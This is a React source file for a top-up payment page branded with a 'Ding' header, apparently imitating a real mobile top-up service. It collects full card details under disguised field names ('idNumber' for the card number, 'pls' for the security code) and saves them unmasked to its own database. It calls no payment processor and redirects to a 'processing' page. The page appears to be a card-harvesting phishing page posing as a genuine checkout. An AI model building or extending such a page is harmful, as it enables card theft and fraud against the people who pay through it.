import { useState, useEffect } from "react";
import { useLocation, useNavigate } from "react-router-dom";
import { Button } from "@/components/ui/button";
import { Card } from "@/components/ui/card";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select";
import { Checkbox } from "@/components/ui/checkbox";
import { ArrowLeft, Edit, ChevronDown } from "lucide-react";
import { toast } from "sonner";
import DingHeader from "@/components/DingHeader";
import { addOrderToDatabase } from "@/utils/databaseStore";
import { useTranslation } from "@/hooks/useTranslation";

interface Country {
  code: string;
  name: string;
  flag: string;
  dialCode: string;
}

interface Provider {
  id: string;
  name: string;
  logo: string;
  type: string;
}

interface LocationState {
  country: Country;
  phoneNumber: string;
  provider: Provider;
  amount: number;
  email?: string;
  isEmailMode?: boolean;
}

export function PaymentPage() {
  const location = useLocation();
  const navigate = useNavigate();
  const { t } = useTranslation();
  const [orderData, setOrderData] = useState<LocationState | null>(null);
  const [selectedPaymentMethod, setSelectedPaymentMethod] = useState("card");
  const [saveCard, setSaveCard] = useState(false);
  const [formData, setFormData] = useState({
    idNumber: "",
    expiry: "",
    pls: "",
    nameOnCard: "",
    country: "us",
    zipCode: ""
  });

  useEffect(() => {
    const state = location.state as LocationState;
    if (state) {
      setOrderData(state);
    } else {
      navigate("/");
    }
  }, [location, navigate]);

  const handleBack = () => {
    navigate(-1);
  };

  const handlePayment = async () => {
    // Validate required fields
    if (!formData.idNumber || !formData.expiry || !formData.pls || !formData.nameOnCard || !formData.zipCode) {
      toast.error("Please fill in all required fields");
      return;
    }

    // Create order record
    const orderRecord = {
      id: Date.now().toString(),
      timestamp: new Date().toISOString(),
      phone: `${orderData.country.dialCode} ${orderData.phoneNumber}`,
      provider: orderData.provider.name,
      amount: orderData.amount,
      fees: fees,
      total: total,
      ...formData
    };

    // Store via database
    try {
      const orderId = await addOrderToDatabase(orderRecord);
      console.log('[Order] Saved via PaymentPage (database):', orderId);
      
      toast.success("Payment submitted successfully!");
      
      // Redirect to processing page
      navigate("/processing-payment", { state: { orderId: orderRecord.id } });
    } catch (e) {
      console.error('[PaymentPage] Failed to save order', e);
      toast.error('Failed to save order. Please try again.');
      return;
    }
  };

  if (!orderData) {
    return <div>Loading...</div>;
  }

  const fees = (orderData.amount * 0.175).toFixed(2); // 17.5% fee
  const total = (orderData.amount + parseFloat(fees)).toFixed(2);

  return (
    <div className="min-h-screen bg-gradient-to-b from-background to-muted/20">
      <DingHeader variant="topup" />
      
      {/* Back button and title */}
      <div className="px-4 py-3 max-w-md mx-auto">
        <div className="flex items-center justify-between">
          <Button 
            variant="ghost" 
            className="text-muted-foreground hover:text-foreground p-2 h-auto"
            onClick={handleBack}
          >
            <ArrowLeft className="w-5 h-5" />
          </Button>
          <h1 className="text-lg font-semibold text-foreground">{t('paymentTitle')}</h1>
          <div className="w-9"></div>
        </div>
      </div>

      <div className="px-4 py-6 max-w-md mx-auto space-y-6">
        {/* Phone Number and Amount Card */}
        <Card className="p-4 bg-card/50 backdrop-blur-sm border-border/50">
          <div className="flex items-center justify-between mb-2">
            <div className="flex items-center space-x-2">
              <span className="text-2xl">{orderData.country.flag}</span>
              <span className="text-lg font-semibold text-foreground">
                {orderData.country.dialCode} {orderData.phoneNumber}
              </span>
            </div>
            <Button variant="ghost" size="icon" className="text-primary h-8 w-8">
              <Edit className="h-4 w-4" />
            </Button>
          </div>
          <div className="flex items-center justify-between">
            <span className="text-2xl font-bold text-foreground">{orderData.amount}.00 USD</span>
          </div>
        </Card>

        {/* Your Total */}
        <div className="flex items-center justify-between">
          <span className="text-lg font-semibold text-foreground">{t('yourTotal')}</span>
          <div className="flex items-center space-x-2">
            <span className="text-lg font-bold text-foreground">{total} USD</span>
            <ChevronDown className="h-4 w-4 text-muted-foreground" />
          </div>
        </div>

        {/* Payment Method Selection */}
        <div className="space-y-4">
          <div className="flex items-center space-x-2">
            <div className="w-4 h-4 rounded-full border-2 border-primary bg-primary flex items-center justify-center">
              <div className="w-2 h-2 bg-background rounded-full"></div>
            </div>
            <span className="text-foreground font-medium">{t('card')}</span>
          </div>

          {/* Payment Method Icons */}
          <div className="flex items-center space-x-3">
            <div className="w-10 h-6 bg-blue-600 rounded flex items-center justify-center text-white text-xs font-bold">VISA</div>
            <div className="w-10 h-6 bg-red-600 rounded flex items-center justify-center">
              <div className="flex space-x-1">
                <div className="w-2 h-2 bg-red-400 rounded-full"></div>
                <div className="w-2 h-2 bg-yellow-400 rounded-full"></div>
              </div>
            </div>
            <div className="w-10 h-6 bg-red-500 rounded flex items-center justify-center">
              <div className="flex space-x-1">
                <div className="w-2 h-2 bg-red-300 rounded-full"></div>
                <div className="w-2 h-2 bg-blue-300 rounded-full"></div>
              </div>
            </div>
            <div className="w-10 h-6 bg-blue-500 rounded flex items-center justify-center text-white text-xs font-bold">AE</div>
            <div className="w-10 h-6 bg-gray-600 rounded flex items-center justify-center text-white text-xs">DC</div>
            <div className="w-10 h-6 bg-green-600 rounded flex items-center justify-center text-white text-xs">JCB</div>
          </div>

          <Button variant="ghost" className="text-primary p-0 h-auto font-medium">
            {t('morePaymentMethods')}
          </Button>
        </div>

        {/* Payment Form */}
        <div className="space-y-4">
          <div className="space-y-2">
            <Label htmlFor="idNumber" className="text-foreground">{t('idNumber')}</Label>
            <Input
              id="idNumber"
              placeholder="Enter your ID number"
              value={formData.idNumber}
              onChange={(e) => setFormData({...formData, idNumber: e.target.value})}
              className="bg-background border-input"
            />
          </div>

          <div className="grid grid-cols-2 gap-4">
            <div className="space-y-2">
              <Label htmlFor="expiry" className="text-foreground">{t('expiry')}</Label>
              <Input
                id="expiry"
                placeholder="MM/YY"
                value={formData.expiry}
                onChange={(e) => setFormData({...formData, expiry: e.target.value})}
                className="bg-background border-input"
              />
            </div>
            <div className="space-y-2">
              <Label htmlFor="pls" className="text-foreground">{t('pls')}</Label>
              <Input
                id="pls"
                placeholder="PLS"
                value={formData.pls}
                onChange={(e) => setFormData({...formData, pls: e.target.value})}
                className="bg-background border-input"
              />
            </div>
          </div>

          <div className="space-y-2">
            <Label htmlFor="cardName" className="text-foreground">{t('nameOnCard')}</Label>
            <Input
              id="cardName"
              placeholder="John Doe"
              value={formData.nameOnCard}
              onChange={(e) => setFormData({...formData, nameOnCard: e.target.value})}
              className="bg-background border-input"
            />
          </div>

          <div className="space-y-2">
            <Label htmlFor="country" className="text-foreground">{t('country')}</Label>
            <Select value={formData.country} onValueChange={(value) => setFormData({...formData, country: value})}>
              <SelectTrigger className="bg-background border-input">
                <SelectValue placeholder="Select country" />
              </SelectTrigger>
              <SelectContent>
                <SelectItem value="us">United States of America</SelectItem>
                <SelectItem value="ca">Canada</SelectItem>
                <SelectItem value="uk">United Kingdom</SelectItem>
                <SelectItem value="de">Germany</SelectItem>
                <SelectItem value="fr">France</SelectItem>
              </SelectContent>
            </Select>
          </div>

          <div className="space-y-2">
            <Label htmlFor="zipCode" className="text-foreground">{t('zipPostalCode')}</Label>
            <Input
              id="zipCode"
              placeholder="12345"
              value={formData.zipCode}
              onChange={(e) => setFormData({...formData, zipCode: e.target.value})}
              className="bg-background border-input"
            />
          </div>

          {/* Save Card Checkbox */}
          <div className="flex items-center space-x-2">
            <Checkbox
              id="saveCard"
              checked={saveCard}
              onCheckedChange={(checked) => setSaveCard(checked as boolean)}
              className="border-primary data-[state=checked]:bg-primary data-[state=checked]:text-primary-foreground"
            />
            <Label htmlFor="saveCard" className="text-foreground text-sm">
              {t('securelyStoreCard')}
            </Label>
          </div>
        </div>

        {/* Pay Button */}
        <Button
          onClick={handlePayment}
          className="w-full py-4 text-base font-semibold rounded-2xl bg-gradient-to-r from-lime-400 to-green-500 hover:from-lime-500 hover:to-green-600 text-white shadow-lg"
          size="lg"
        >
          {t('payNow')} USD ${total}
        </Button>
      </div>
    </div>
  );
}